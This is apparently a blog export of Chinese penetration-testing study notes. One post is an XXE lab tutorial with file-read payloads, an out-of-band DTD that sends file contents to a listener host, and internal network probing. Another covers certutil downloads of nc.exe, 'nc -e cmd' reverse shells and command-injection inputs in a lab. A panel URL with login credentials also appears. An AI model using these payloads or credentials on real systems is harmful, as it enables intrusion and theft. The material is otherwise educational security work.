class="line">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240530112606820.png" alt="image-20240530112606820"></p><p>这个时候就会如上图一样，报很多错误，主要是因为我们要读取的文件内容中存在很多的特殊字符：大于号、小于号等，我们在前面的XML基础中也提到过，当xml的标签内还存在小于号、大于号等特殊字符时，尤其是小于号，会被XML解析器误认为是另一个标签的开始，这样就会造成解析的错误。</p><p>所以我们就要想办法绕过。我们这里提供两种绕过办法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. php伪协议</span><br><span class="line">2. XML CDATA</span><br></pre></td></tr></table></figure><p>我们先使用伪协议进行读取，使用的payload如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=C:/Users/Administrator/Desktop/xmlerror.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;%26xxe;&lt;/root&gt;</span><br><span class="line">#PHRoaXMgaXMgYSB0ZXN0PiY8IyM=</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240530112746123.png" alt="image-20240530112746123"></p><p><img src="/../image/image-20240530112824450.png" alt="image-20240530112824450"></p><p>进行base64解码后，就是文件的内容</p><p>接下来，我们利用CDATA进行内容的读取：</p><p>需要先了解一下XML CDATA，默认情况下，XML文档中的文本都会被XML解析器解析，但是会忽略CDATA区段中的文本。</p><p>我们看下W3school提供的CDATA使用方式：</p><p><img src="/../image/image-20240530113037168.png" alt="image-20240530113037168"></p><p>从w3school给出的例子，我们也大概知道了CDATA的使用方式，但是其还需要注意几点：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&gt; CDATA 部分不能包含字符串 &quot;]]&gt;&quot;。也不允许嵌套的 CDATA 部分，这样会导致异常的闭合，从而使解析器报错。</span><br><span class="line">b&gt; 标记 CDATA 部分结尾的 &quot;]]&gt;&quot; 不能包含空格或换行。</span><br></pre></td></tr></table></figure><p>那么了解了这些，我们就可以尝试使用CDATA再次去读取目标文件的内容，我们首先需要把要读取的到的内容放在CDATA中，但是CDATA并没有提供拼接的方法，所以我们需要去尝试，我们这里暂且使用普通实体进行拼接尝试<strong>（注意是尝试）</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;</span><br><span class="line">   &lt;!ENTITY end &quot;]]&gt;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;start;&amp;xxe;&amp;end;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>我们的想法是这样的，将CDATA的格式内容写在start和end两个实体里面，然后在调用实体的时候，先后调用三个实体，将实体内容进行拼接，拼接后的内容被XML解析器解析。但是测试失败：</p><p><img src="/../image/image-20240530113409608.png" alt="image-20240530113409608"></p><p>这说明我们的拼接方式不可行，我们现在使用的是一般实体，我们在前面的xml基础知识中介绍过了，一般实体的引用是在xml文档内容中，既然在xml文档内容中拼接不可行，那在dtd中拼接可行吗？我们再次进行尝试，既然再dtd中拼接，那就需要用到参数实体了。</p><p>我们再次尝试构造payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">   &lt;!ENTITY % xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;</span><br><span class="line">   &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">   &lt;!ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;all;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240530113535516.png" alt="image-20240530113535516"></p><p>理论上，我们完美地将这几个参数实体拼接了起来，并将值赋给了一般实体all，但是遗憾的是，我们的payload还是报错了：</p><p>那么这又是为什么呢？根据XML规范所描述：“在DTD内部子集中的参数实体调用，不能混掺到标记语言中”，这是什么意思呢？就是不能在实际的标记语言中来调用参数实体，像我们这样，就是在标记语言中进行调用，他需要在DTD中单独来调用：</p><p><img src="/../image/image-20240530113612099.png" alt="image-20240530113612099"></p><p>规范中，还说到：“但可以在同级别中被当作标记语言调用” ，就像是参数实体的引用，就是将调用当成了一个标记语言，也就是我们前面说的需要在DTD中单独调用，像这样：</p><p><img src="/../image/image-20240530113618932.png" alt="image-20240530113618932"></p><p>也就是我们所构造的payload这种使用方式，不能在内部DTD中被这样使用，但是幸运的是，XML规范还声明了一点：“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload，将我们的CDATA内容拼接起来：</p><p><img src="/../image/image-20240530113636226.png" alt="image-20240530113636226"></p><p>这就要求我们作为攻击者，需要有一台服务器来提供外部的恶意DTD文件的读取，我们实验环境中就用一个机器来同时作为攻击机和受害机，效果一样的。</p><p>DTD文件的内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY evil &quot;%start;%xxe;%end;&quot; &gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">   &lt;!ENTITY % xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;</span><br><span class="line">   &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">   &lt;!ENTITY % all SYSTEM &quot;http://192.168.0.3/evil.dtd&quot;&gt;</span><br><span class="line">   %all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;evil;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240530114154563.png" alt="image-20240530114154563"></p><p>这是因为，漏洞示例代码中的打印函数选的不好，print_r()函数在遇到这种内容中有导致标签闭合的字符串时，就会返回出空的SimpleXMLElement对象。我们可以做如下测试，编辑如下php代码（已经存在于step2路径下print_test.php和网站根目录下index.php）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">##echo &quot;Hello World&quot;;</span></span><br><span class="line"><span class="variable">$xml</span>=<span class="string">&lt;&lt;&lt;XML</span></span><br><span class="line"><span class="string">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="string">   &lt;!ENTITY start &quot;&lt;![CDATA[&#x27;&lt;&gt;!@#!$&#x27;]]&gt;&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;start;&lt;/root&gt;</span></span><br><span class="line"><span class="string">XML</span>;</span><br><span class="line"><span class="variable">$xxe_</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$xxe_</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xxe_</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;----------------------------&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$xxe_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240530114316095.png" alt="image-20240530114316095"></p><p>可见，唯独print_r()，没有输出这些特殊的字符串。这种情况，如果漏洞代码中使用的是echo，就可以输出了。感兴趣的同学可以自己修改代码来验证。</p><p>Ps：</p><p>由于环境资源的关系，我们在进行攻击时，所使用的外部dtd文件，是本地环境的。但是在实际的攻击情况下，这个DTD文件应该是我们自己所掌握的主机的DTD文件，文件的内容是受我们所控的。</p><h3 id="无回显的本地文件读取"><a href="#无回显的本地文件读取" class="headerlink" title="无回显的本地文件读取"></a>无回显的本地文件读取</h3><p>（OOB out-of-band 外带参数实体注入）</p><p>在实际情况中，大多数情况下服务器上的 XML 并不是输出用的，所以就少了输出这一环节，这样的话，即使漏洞存在，我们的payload的也被解析了，但是由于没有输出，我们也不知道解析得到的内容是什么，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带数据</p><p>先看一下漏洞示例（已经在桌面demo&#x2F;PHP_XML&#x2F;step3&#x2F;out_xxe.php和网站根目录下out_xxe.php）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">libxml_disable_entity_loader</span> (<span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相较于前面有回显的漏洞代码，主要功能没有大的变化，但是代码中没有内容输出的部分。这样，用之前的payload就没有作用了（当然这个任务中的漏洞示例代码，加个输出，也同样适用于前面的任务）。</p><p>那么怎样才能成功读取到内容呢，我们可以这样进行Payload的构造：</p><p>有了前面使用外部DTD文件来拼接内部DTD的参数实体的经验，我们可以知道，通过外部DTD的方式可以将内部参数实体的内容与外部DTD声明的实体的内容拼接起来，那么我们就可以有这样的设想：</p><p>我们可以在本地做一个端口监听，然后利用payload来从目标主机读取到文件内容后，将文件内容作为url的一部分来请求我们本地监听的端口，这样，我们只需要查看请求的url就可以知道读取到的内容是什么。</p><p>首先，我们使用ncat监听一个端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ncat -lvvp 3333</span><br></pre></td></tr></table></figure><p>然后，我们构造payload：</p><p>我们选择使用外部DTD，在我们自己所能掌控（或是自己搭建）的主机上编写一个dtd文件（实验环境中，就是我们所使用的这台机器），我在这里命名为evil_xxe.dtd：</p><p>(已经在桌面demo&#x2F;PHP_XML&#x2F;step3&#x2F;evil_xxe.dtd和网站根目录下evil_xxe.dtd)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=C:/Users/Administrator/Desktop/xmlerror.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY send SYSTEM &#x27;http://192.168.0.3:3333/?%xxe;&#x27;&gt;&quot;&gt;</span><br><span class="line">%dtd;</span><br></pre></td></tr></table></figure><p>第一个参数实体的声明中使用到了php的伪协议，将需要读取的内容进行base64编码，这样是为了尽量避免由于文件内容的特殊性，产生xml解析器错误。</p><p>然后第二个参数实体，对我们监听的主机和端口进行访问，并将读取到的参数实体xxe的内容作为请求的参数。</p><p>这样，Payload就会很简单了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root SYSTEM &quot;http://192.168.0.3/evil_xxe.dtd&quot;&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>bp抓包,加入payload</p><p><img src="/../image/image-20240530115304630.png" alt="image-20240530115304630"></p><p>然后查看我们的端口监听情况，会发现我们收到了一个连接请求，问号后面的内容就是我们读取到的文件内容经过编码后的字符串：</p><p><img src="/../image/image-20240530115450922.png" alt="image-20240530115450922"></p><p>Ps：</p><p>有时候也会出现报错的情况，一方面我们在漏洞的代码中没有屏蔽错误和警告，另一方面如果我们监听的端口失效，当目标服务器尝试访问我们监听的端口，但失败的时候，就会爆出错误和警告，但是也可以从爆出的警告中看到我们需要的信息。</p><p><img src="/../image/image-20240530115518077.png" alt="image-20240530115518077"></p><h3 id="XXE其他利用方式"><a href="#XXE其他利用方式" class="headerlink" title="XXE其他利用方式"></a>XXE其他利用方式</h3><p>当然进行内网探测我们还需要做一些准备工作，就是获取目标主机在内网中的IP地址，或是内网的网络划分信息，我们可以先利用 file 协议读取我们作为跳板服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 &#x2F;etc&#x2F;network&#x2F;interfaces 或者 &#x2F;proc&#x2F;net&#x2F;arp 或者 &#x2F;etc&#x2F;host 等跟内网配置有关的文件，我们可以通过这些文件的内容来获取更多有关内网的信息。</p><p>如果实在没有办法获取目标主机的内网配置相关信息，，，那就花费时间爆破吧。</p><p><strong>内网存活主机探测：</strong></p><p>如下，其实payload就是简单的一个外部实体的注入payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root SYSTEM &quot;http://192.168.0.3/&quot;&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240530115905642.png" alt="image-20240530115905642"></p><p>只不过是将http:&#x2F;&#x2F;后面的部分替换为目标主机，这样当目标主机存活时，如果80端口没有对应的服务，那么很快就会i发现警告信息，如上图。</p><p>那如果目标主机不存在，那么我们所利用的XXE漏洞的服务器，就会花费一些时间在网络总寻找目标主机，直到超时。如下图：</p><p><img src="/../image/image-20240530120058731.png" alt="image-20240530120058731"></p><p>如果觉得手动的探测慢的话，当然可以自己编写一个脚本来进行自动探测，将没有超时的主机记录下来即可。</p><p><strong>内网主机端口探测：</strong></p><p>同样的，根据内网存活主机的扫描方式，我们也可以针对某个主机进行端口的扫描。但是端口的探测准确性比较低，判断的标准也不一样。由于环境的不同，版本的不同，你可能会遇到任何一个端口的返回都是200状态码和警告信息以及我们期望输出的字符串，那么这个时候哪些端口是打开的，哪些端口是关闭的，就需要你自己去判断了。</p><h2 id="通过XXE漏洞进行命令执行（非本实验重点）"><a href="#通过XXE漏洞进行命令执行（非本实验重点）" class="headerlink" title="通过XXE漏洞进行命令执行（非本实验重点）"></a><strong>通过XXE漏洞进行命令执行（非本实验重点）</strong></h2><p>这种情况比较少见，所需的前提条件除了真实存在XXE漏洞外，大概还需要：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&gt; 目标系统为Linux系统</span><br><span class="line">b&gt; 目标系统成功安装PHP的expect扩展</span><br></pre></td></tr></table></figure><p>而且这个漏洞所执行的命令也有限制：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&gt; 可执行的命令与当前用户的权限大小有关</span><br><span class="line">b&gt; 命令中不能有空格，否则会报错</span><br></pre></td></tr></table></figure><p>一般情况下payload（实验环境限制，我们的环境时windows环境，没有进行测试，大家可以在自己的本地搭建Linux环境测试）：</p><p><img src="/../image/image-20240530120038746.png" alt="image-20240530120038746"></p><h4 id="通过XXE漏洞进行DOS攻击（不要轻易尝试，当然，也可能现在已经没有效果了）。"><a href="#通过XXE漏洞进行DOS攻击（不要轻易尝试，当然，也可能现在已经没有效果了）。" class="headerlink" title="通过XXE漏洞进行DOS攻击（不要轻易尝试，当然，也可能现在已经没有效果了）。"></a><strong>通过XXE漏洞进行DOS攻击<strong><strong>（不要轻易尝试，当然，也可能现在已经没有效果了）</strong></strong>。</strong></h4><p>Payload如下：</p><p><img src="/../image/image-20240530120031896.png" alt="image-20240530120031896"></p><p>上面的payload就是著名的“billion laughs”攻击，该代码可以在目标主机的内存中生成十亿个“lol”字符串，从而导致 Dos攻击。它也被称为指数实体扩展攻击，是一种名副其实的XML炸弹。原理为：通过创建一项递归的 XML 定义，构造恶意的XML实体文件耗尽可用内存，如以上代码所示，在XMl中定义了一个实体lol9，它的值包含了十个实体lol8的值，而每个lol8又包含了十个lol7的值…最后产生10亿个“lol”字符串，占用内存约高达3GB。因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，这样，就会占用大量的内存资源，造成了拒绝服务器攻击。</p><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><h4 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a><strong>方案一：</strong></h4><p>过滤用户输入的xml数据，比如尖括号，一些关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC等</p><h4 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a><strong>方案二：</strong></h4><p>禁用外部实体：</p><p>PHP：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>JAVA:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>Python：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xd</title>
      <link href="/2024/05/29/xd/"/>
      <url>/2024/05/29/xd/</url>
      
        <content type="html"><![CDATA[<h1 id="Day1-操作系统-名词-文件下载-反弹SHELL-防火墙绕过"><a href="#Day1-操作系统-名词-文件下载-反弹SHELL-防火墙绕过" class="headerlink" title="Day1:操作系统-名词-文件下载-反弹SHELL-防火墙绕过"></a>Day1:操作系统-名词-文件下载-反弹SHELL-防火墙绕过</h1><p><strong>前后端，POC&#x2F;ExP，Payload&#x2F;shellcode，后门&#x2F;webshe1l，木马&#x2F;病毒反弹，回显，跳板（科学上网），黑白盒测试（不知道&#x2F;知道源代码），暴力解，社会工程学，撞库，ATT&amp;CK]<a href="https://attack.mitre.org/%E7%AD%89%E5%8F%82%E8%80%83">https://attack.mitre.org/等参考</a>:</strong></p><p><a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><p><a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p><p>术语解释：<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p><h2 id="1-渗透测试常用专业术语"><a href="#1-渗透测试常用专业术语" class="headerlink" title="1.渗透测试常用专业术语"></a>1.渗透测试常用专业术语</h2><h3 id="1-1-POC、EXP、Payload与Shellcode"><a href="#1-1-POC、EXP、Payload与Shellcode" class="headerlink" title="1.1. POC、EXP、Payload与Shellcode"></a>1.1. POC、EXP、Payload与Shellcode</h3><blockquote><p>POC:全称’ProofofConcept’，中文’概念验证”，常指一段漏洞证明的代码。</p><p>EXP:全称’Exploit”，中文‘利用’，指利用系统漏洞进行攻击的动作。</p><p>Payload:中文’有效载荷’，指成功exploit之后，真正在目标系统执行的代码或指令</p><p>shellcode:简单翻译”shell代码’，是Payioad的一种，由于其建立正向&#x2F;反向shell而得名</p></blockquote><p><strong>注意：</strong></p><ol><li>POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Ep通常是有害的，有了POC，才有EXP。</li><li>Payload有很多种，它可以是Shelcde，也可以直接是一段系统命令。同一个Payoad可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP</li><li>Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。</li></ol><h3 id="基础案例1"><a href="#基础案例1" class="headerlink" title="#基础案例1:"></a>#基础案例1:</h3><p><strong>操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙</strong></p><ul><li>1、个人计算机&amp;服务器用机</li><li>2、windows&amp;Linux常见命令</li><li>3、文件权限&amp;服务权限&amp;用户权限等</li><li>4、系统用户&amp;用户组&amp;服务用户等分类</li><li>5、自带防火墙出站&amp;入站规则策略协议</li></ul><h3 id="实用案例1"><a href="#实用案例1" class="headerlink" title="#实用案例1:"></a>#实用案例1:</h3><p><strong>文件上传下载-解决无图形化&amp;解决数据传输</strong><br>Linux:wget curl python ruby perl java等</p><p>Windows: PowerShell Certutil Bitsadmin msiexec mshta rundl132</p><p>在服务器上准备好nc.exe</p><p><img src="/../image/image-20240318173257483.png" alt="image-20240318173257483"></p><p>再通过访问该地址，下载nc到本机</p><p><img src="/../image/image-20240318173450975.png" alt="image-20240318173450975"></p><p>或者用curl命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http:192.168.174.143/nc/nc.exe -o nc2.exe</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240318173743501.png"></p><h3 id="实用案例2"><a href="#实用案例2" class="headerlink" title="#实用案例2:"></a>#实用案例2:</h3><p><strong>反弹shell命令-解决数据回显&amp;解决数据通讯</strong></p><p>useradd 用户名 passwd 用户名</p><p>测试linux系统添加用户或修改密码命令交互回显问题</p><p> 这里我一个用windows10作为本机，centos7作为服务器</p><p>windows：192.168.174.143</p><p>centos：192.168.174.142</p><p>首先在centos设置监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 5566</span><br></pre></td></tr></table></figure><p>然后在windows10用nc把cmd弹过来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e cmd 192.168.174.142</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240318191948435.png" alt="image-20240318191948435"></p><p>也能成功就是会乱码</p><p><img src="/../image/image-20240318192011869.png" alt="image-20240318192011869"></p><p>如果是虚拟机就把cmd改为&#x2F;bin&#x2F;bash</p><p>但这个只是在内网的情况下，如果需要连接外网，我们需要用到路由的端口转，详细见Day2</p><h3 id="结合案例1"><a href="#结合案例1" class="headerlink" title="#结合案例1:"></a>#结合案例1:</h3><p>防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</p><p>1、内网:<br>内网 -&gt; 服务器</p><p>服务器!-&gt;内网</p><p>2、防火墙:<br>服务器&lt;-&gt; aliyun</p><p>服务器防火墙-&gt; aliyun</p><p>aliyun !-&gt; 服务器防火墙</p><p>关键就是防火墙会拒绝外部进来的数据，所以内部就监听不到东西，这时候如果把windows给到服务器，这时候就变成出站了，限制就没那么严格</p><p><img src="/../image/image-20240318193645056.png" alt="image-20240318193645056"></p><p>正向，就是我主动找你，把我的cmd给你</p><p>反向，对方来找我，把它的cmd给我</p><p>对windows来说是正向，对linux是反向，因为是windows找linux，要看是以谁为参照物</p><h3 id="结合案例2"><a href="#结合案例2" class="headerlink" title="#结合案例2:"></a>#结合案例2:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#python2一句话服务器</span><br><span class="line">python -m SimpleHTTPServer 8080</span><br><span class="line">#python3</span><br><span class="line">python -m Http.server 8080</span><br></pre></td></tr></table></figure><p><strong>学会了有手就行-Fofa拿下同行Pikachu服务器</strong></p><p>这个没有自己的服务器，没办法上传，就本地的靶场试试</p><p>文件下载&amp;反弹she11:<br>certutil -urlcache -split -f <a href="http://192.168.174.143/nc/nc.exe">http://192.168.174.143/nc/nc.exe</a> nc -e cmd 192.168.174.142 5566</p><p><img src="/../image/image-20240318201521348.png" alt="image-20240318201521348"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; certutil -urlcache -split -f http://192.168.174.143/nc/nc.exe</span><br><span class="line">127.0.0.1 &amp; dir</span><br><span class="line">127.0.0.1 &amp; nc -e cmd 192.168.174.142 5566</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240318202023597.png" alt="image-20240318202023597"></p><p><img src="/../image/image-20240318202040571.png" alt="image-20240318202040571"></p><p><img src="/../image/image-20240318202107378.png" alt="image-20240318202107378"></p><h1 id="Day2-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#Day2-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="Day2:Web应用_架构搭建_漏洞_HTTP数据包_代理服务器"></a>Day2:Web应用_架构搭建_漏洞_HTTP数据包_代理服务器</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="#知识点:"></a>#知识点:</h2><ol><li>网站搭建前置知识</li><li>WEB应用环境架构类</li><li>WEB应用安全漏洞分类</li><li>WEB请求返回过程数据包</li></ol><h2 id="网站搭建前置知识"><a href="#网站搭建前置知识" class="headerlink" title="#网站搭建前置知识"></a>#网站搭建前置知识</h2><p>域名，子域名，DNS，HTTP&#x2F;HTTPS，证书等</p><blockquote><p>一、什么是主域名？</p><p>主域名由两个或两个以上的字母构成，中间由点号隔开，整个域名通常只有1个点号。 百度的主域名是baidu.com。<br>二、什么是子域名？</p><p>子域名一般会根据站点不同性质在主域名前面加上不同的前缀构成，通常比主域名多一个点或两个点。只要在主域名前面加上前缀的都是该主域名的子域名，子域名又能分为二级子域名、三级子域名、还有多级子域名。 子域名会在主域名前面加上不同的前缀，通常比主域名多一个点或两个点。只要在主域名前面加上前缀的都是该主域名的子域名，子域名又能分为二级子域名、三级子域名、还有多级子域名。</p><p>例如：百度的二级域名（子域名）<a href="http://www.baidu.com/">www.baidu.com</a> 如1.<a href="http://www.baidu.com和2.www.baidu.com这样的三级域名也同样可以成为www.baidu.com和baidu.com的子域名./">www.baidu.com和2.www.baidu.com这样的三级域名也同样可以成为www.baidu.com和baidu.com的子域名。</a></p></blockquote><p><strong>国内的域名需要备案才能被访问，否则只有非大陆地区才能访问</strong></p><p><img src="/../image/image-20240319181055521.png" alt="image-20240319181055521"></p><h3 id="一键部署Zblog"><a href="#一键部署Zblog" class="headerlink" title="一键部署Zblog"></a><strong>一键部署Zblog</strong></h3><p><img src="/../image/image-20240319225656061.png" alt="image-20240319225656061"></p><p><img src="/../image/image-20240319230124584.png" alt="image-20240319230124584"></p><p><img src="/../image/image-20240319230134261.png" alt="image-20240319230134261"></p><h2 id="WEB应用环境架构类"><a href="#WEB应用环境架构类" class="headerlink" title="#WEB应用环境架构类"></a>#WEB应用环境架构类</h2><p>理解不同WEB应用组成角色功能架构:</p><p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等</p><p>开发语言:asp,php,aspx,jsp,java,python,ruby,go,html,javascript等</p><p>程序源码:根据开发语言分类;应用类型分类;开源CMS分类;开发框架分类等</p><p>中间件容器:IIS,Apache,Nginx,Tomcat,weblogic,Jboos,glasshfish等</p><p>数据库类型:Access,Mysql,Mssql,0racle,db2,Sybase,Redis,MongoDB等</p><p>服务器操作系统:windows系列，Linux系列，Mac系列等</p><p>第三方软件:phpmyadmin,vs-ftpd,VNC，chibpenssh等</p><h2 id="WEB应用安全漏洞分类"><a href="#WEB应用安全漏洞分类" class="headerlink" title="#WEB应用安全漏洞分类"></a>#WEB应用安全漏洞分类</h2><p>SQL注入，文件安全，RCE执行，Xss跨站，CSRF&#x2F;SSRF&#x2F;CRLF，反序列化，逻辑越权，未授权访问，XXE&#x2F;XML，弱口令安全等</p><blockquote><p>面板地址:<a href="http://60.205.125.117:8888/3d189822">http://60.205.125.117:8888/3d189822</a><br>用户名:msdiqfwn<br>密码:c10a904a</p></blockquote><h2 id="WEB请求返回过程数据包参考"><a href="#WEB请求返回过程数据包参考" class="headerlink" title="#WEB请求返回过程数据包参考"></a>#WEB请求返回过程数据包参考</h2><p><a href="https://www.jianshu.com/p/558455228c43">https://www.jianshu.com/p/558455228c43</a></p><p><a href="https://www.cnblogs.com/cherrycui/p/10815465.html">https://www.cnblogs.com/cherrycui/p/10815465.html</a></p><p>请求数据包，请求方法，请求体，响应包，响应头，状态码，代理服务器等</p><p>Request,Response,User-Agent,Cookie,Server,Content-Length等</p><h2 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例:"></a>演示案例:</h2><p>架构-Web应用搭建-域名源码解析</p><p>请求包-新闻回帖点赞-重放数据包</p><p><img src="/../image/image-20240319205949190.png" alt="image-20240319205949190"></p><p>点赞抓包，发送到重放模块</p><p><img src="/../image/image-20240319210012855.png" alt="image-20240319210012855"></p><p>不断发送，使得本来只能点一次的赞，能够点多次</p><p><img src="/../image/image-20240319210241684.png" alt="image-20240319210241684"></p><p>请求包-移动端&amp;PC访问-自定义UA头</p><p>这里我们分别用电脑和手机模拟器访问bing搜索</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">电脑</span><br><span class="line">GET /?mkt=zh-CN&amp;mkt=zh-CN HTTP/1.1</span><br><span class="line">Host: www.bing.com</span><br><span class="line">...</span><br><span class="line">User-Agent: Mozilla/5.0 (<span class="strong">**Windows NT 10.0**</span>; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<span class="emphasis">*/*</span>;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Dest: 